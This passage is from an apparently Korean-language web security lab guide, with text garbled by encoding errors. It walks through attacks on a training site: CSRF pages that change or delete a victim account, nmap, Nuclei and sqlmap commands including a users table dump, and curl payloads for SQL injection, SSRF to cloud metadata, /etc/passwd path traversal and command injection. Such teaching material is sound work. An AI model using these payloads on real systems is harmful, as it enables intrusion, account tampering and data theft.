                credentials: 'include',  // ì¿ í‚¤ í¬í•¨
                body: JSON.stringify({
                    email: 'hacked@evil.com',
                    phone: '010-9999-9999',
                    address: 'í•´í‚¹ëœ ì£¼ì†Œ',
                    marketingAgree: true
                })
            })
            .then(r => r.text())
            .then(data => alert('ê²°ê³¼: ' + data));
        }
    </script>
    
    <button onclick="attack()">ê²½í’ˆ ë°›ê¸°</button>
</body>
</html>
```

**Step 2)** victim ê³„ì •ìœ¼ë¡œ ëŒ€ìƒ ì‚¬ì´íŠ¸ ë¡œê·¸ì¸ (ë‹¤ë¥¸ ë¸Œë¼ìš°ì €/ì‹œí¬ë¦¿ ëª¨ë“œ)
- http://3.34.212.183/login.html
- `victim` / `Test1234!`

**Step 3)** ë¡œê·¸ì¸ ìƒíƒœì—ì„œ csrf_test.html íŒŒì¼ ì—´ê¸°
- íŒŒì¼ ë”ë¸”í´ë¦­ ë˜ëŠ” ë¸Œë¼ìš°ì €ì—ì„œ `file:///ê²½ë¡œ/csrf_test.html`

**Step 4)** "ê²½í’ˆ ë°›ê¸°" ë²„íŠ¼ í´ë¦­

**Step 5)** victim ê³„ì • ë§ˆì´í˜ì´ì§€ì—ì„œ ì •ë³´ ë³€ê²½ í™•ì¸
- http://3.34.212.183/mypage.html

### 9.4 ì˜ˆìƒ ê²°ê³¼

victimì˜ ì´ë©”ì¼, ì „í™”ë²ˆí˜¸, ì£¼ì†Œê°€ ê³µê²©ìê°€ ì§€ì •í•œ ê°’ìœ¼ë¡œ ë³€ê²½ë¨

**ğŸ“¸ ìŠ¤í¬ë¦°ìƒ· í¬ì¸íŠ¸**:
1. CSRF ê³µê²© í˜ì´ì§€
2. ë³€ê²½ëœ íšŒì› ì •ë³´

### 9.5 íšŒì› íƒˆí‡´ CSRF (ë” ìœ„í—˜)

```html
<script>
    fetch('http://3.34.212.183/api/member/withdraw', {
        method: 'DELETE',
        credentials: 'include'
    });
</script>
```

> âš ï¸ **ì£¼ì˜**: ì‹¤ìŠµ ì‹œ ê³„ì •ì´ ì‹¤ì œë¡œ ì‚­ì œë©ë‹ˆë‹¤!

---

## 10. Kali Linux ë„êµ¬ í™œìš©

### 10.1 nmap - í¬íŠ¸/ì„œë¹„ìŠ¤ ìŠ¤ìº”

```bash
# ê¸°ë³¸ í¬íŠ¸ ìŠ¤ìº”
nmap 3.34.212.183

# ì„œë¹„ìŠ¤ ë²„ì „ íƒì§€
nmap -sV 3.34.212.183

# ì¢…í•© ìŠ¤ìº” (OS + ì„œë¹„ìŠ¤ + ìŠ¤í¬ë¦½íŠ¸)
sudo nmap -p 22,80,8080,3306 -sS -Pn -T4 3.34.212.183
```

**ì˜ˆìƒ ê²°ê³¼:**
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
3306/tcp open  mysql
```

---

### 10.2 Nuclei - ìë™ ì·¨ì•½ì  ìŠ¤ìº”

```bash
# Go ì„¤ì¹˜ (í•„ìš” ì‹œ)
sudo apt update
sudo apt install golang-go -y

# Nuclei ì„¤ì¹˜
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

# PATH ì„¤ì • (.bashrc ë˜ëŠ” .zshrc)
echo 'export PATH=$HOME/go/bin:$PATH' >> ~/.zshrc
source ~/.zshrc

# ì„¤ì¹˜ í™•ì¸
nuclei -version

# í…œí”Œë¦¿ ì—…ë°ì´íŠ¸
nuclei -update-templates
```

#### ê¸°ë³¸ ì‚¬ìš©ë²•
```bash
# ë‹¨ì¼ URL ìŠ¤ìº”
nuclei -u http://<target>

# í¬íŠ¸ í¬í•¨
nuclei -u http://<target>:8080

# HTTPS
nuclei -u https://<target>

# IP ì£¼ì†Œ
nuclei -u 3.34.212.183

# ë„¤íŠ¸ì›Œí¬ ì„œë¹„ìŠ¤ (í¬íŠ¸ ì§€ì •)
nuclei -u 3.34.212.183:8080
```

#### ìë™ ìŠ¤ìº”(ì¶”ì²œ)
```bash
# Automatic Scanning - ê¸°ìˆ  ìŠ¤íƒ ìë™ ê°ì§€
nuclei -u http://3.34.212.183 -as -rl 50 -c 10

# ì˜ˆì‹œ
nuclei -u http://3.34.212.183:8080 -as -rl 50 -c 10

# Markdown ì¶œë ¥
nuclei -u http://3.34.212.183 -as -rl 50 -c 10 -markdown -o report.md
```

---

### 10.3 sqlmap - SQL Injection ìë™í™”

**Step 1)** BurpSuiteì—ì„œ ë¡œê·¸ì¸ ìš”ì²­ ì €ì¥ (`login.txt`)

`login.txt` ì˜ˆì‹œ
```text
POST /api/login HTTP/1.1
Host: 3.34.212.183
Content-Length: 20
Accept-Language: ko-KR,ko;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: */*
Origin: http://3.34.212.183
Referer: http://3.34.212.183/login.html
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=7388F44438EC6DDBB0A4E842D0ADF3B2
Connection: keep-alive

id=admin&pw=admin123
```

**Step 2)** sqlmap ì‹¤í–‰
```bash
# ê¸°ë³¸ í…ŒìŠ¤íŠ¸
sqlmap -r login.txt --batch

# ë°ì´í„°ë² ì´ìŠ¤ ëª©ë¡
sqlmap -r login.txt --dbs --batch

# í…Œì´ë¸” ë¤í”„
sqlmap -r login.txt -D lecture_db -T users --dump --batch
```

---

### 10.4 curl - ë¹ ë¥¸ í…ŒìŠ¤íŠ¸

```bash
# SQL Injection í…ŒìŠ¤íŠ¸
curl -X POST http://3.34.212.183/api/login \
  -d "id=admin&pw=test' OR '1'='1"

# SSRF í…ŒìŠ¤íŠ¸
curl "http://3.34.212.183/api/inquiry/proxy?url=http://169.254.169.254/latest/meta-data/"

# Path Traversal í…ŒìŠ¤íŠ¸
curl "http://3.34.212.183/api/file/download?saveName=../../../etc/passwd&originName=test.txt"
```

---

## 11. ì²´í¬ë¦¬ìŠ¤íŠ¸

### ì‹¤ìŠµ ì™„ë£Œ í™•ì¸

**í•µì‹¬ ì·¨ì•½ì  (BurpSuite)**

| # | ì·¨ì•½ì  | OWASP | ì™„ë£Œ | ìŠ¤í¬ë¦°ìƒ· |
|---|--------|-------|:----:|:--------:|
| 1 | SQL Injection - ë¡œê·¸ì¸ ìš°íšŒ | A03 | â˜ | â˜ |
| 2 | Stored XSS - ë¬¸ì˜ ê²Œì‹œíŒ | A03 | â˜ | â˜ |
| 3 | SSRF - ì„œë²„ ì¸¡ ìš”ì²­ ìœ„ì¡° | A10 | â˜ | â˜ |
| 4 | Command Injection (ADMIN) | A03 | â˜ | â˜ |
| 5 | Path Traversal - íŒŒì¼ ë‹¤ìš´ë¡œë“œ | A01 | â˜ | â˜ |
| 6 | ë¯¼ê°ì •ë³´ ë…¸ì¶œ - ë¹„ë°€ë²ˆí˜¸ | A02 | â˜ | â˜ |
| 7 | ê¶Œí•œ ê²€ì¦ ë¯¸í¡ - ê³µì§€ì‚¬í•­ | A01 | â˜ | â˜ |
| 8 | CSRF - íšŒì› ì •ë³´ ë³€ê²½ | A01 | â˜ | â˜ |

**Kali Linux ë„êµ¬**

| # | ë„êµ¬ | ì™„ë£Œ | ìŠ¤í¬ë¦°ìƒ· |
|---|--------|:----:|:--------:|
| 9 | nmap - í¬íŠ¸/ì„œë¹„ìŠ¤ ìŠ¤ìº” | â˜ | â˜ |
| 10 | Nuclei - ìë™ ì·¨ì•½ì  ìŠ¤ìº” | â˜ | â˜ |
| 11 | sqlmap - DB ë¤í”„ | â˜ | â˜ |

### OWASP TOP 10 ë§¤í•‘

| ì·¨ì•½ì  | OWASP 2021 | CWE |
|--------|------------|-----|
| SQL Injection | A03: Injection | CWE-89 |
| Stored XSS | A03: Injection | CWE-79 |
| Command Injection | A03: Injection | CWE-78 |
| SSRF | A10: Server-Side Request Forgery | CWE-918 |
| Path Traversal | A01: Broken Access Control | CWE-22 |
| ë¯¼ê°ì •ë³´ ë…¸ì¶œ | A02: Cryptographic Failures | CWE-312 |
| ê¶Œí•œ ê²€ì¦ ë¯¸í¡ | A01: Broken Access Control | CWE-862 |
| CSRF | A01: Broken Access Control | CWE-352 |

---

## ğŸ“š ì°¸ê³ 

- **ì·¨ì•½ì ë³„ Payload ìš”ì•½**

| ì·¨ì•½ì  | ëŒ€í‘œ Payload |
|--------|-------------|
| SQL Injection | `id=admin&pw=test' OR '1'='1` |
| XSS | `<script>alert('XSS')</script>` |
| SSRF | `?url=http://169.254.169.254/latest/meta-data/` |
| Command Injection | `?host=8.8.8.8;id` |
| Path Traversal | `?saveName=../../../etc/passwd` |

- **BurpSuite ë‹¨ì¶•í‚¤**
  - `Ctrl+R`: Repeaterë¡œ ì „ì†¡
  - `Ctrl+I`: Intruderë¡œ ì „ì†¡

---

> **ì‘ì„±**: ì§„ë‹¨íŒ€  
> **ë²„ì „**: 2.0  
> **ë³€ê²½ ì´ë ¥**:  
> - v1.0: ì´ˆê¸° ì‘ì„±  
> - v2.0: ì†ŒìŠ¤ì½”ë“œ ë¶„ì„ ê¸°ë°˜ í˜ì´ë¡œë“œ ê²€ì¦, SSRF/Command Injection/Path Traversal ì¶”ê°€
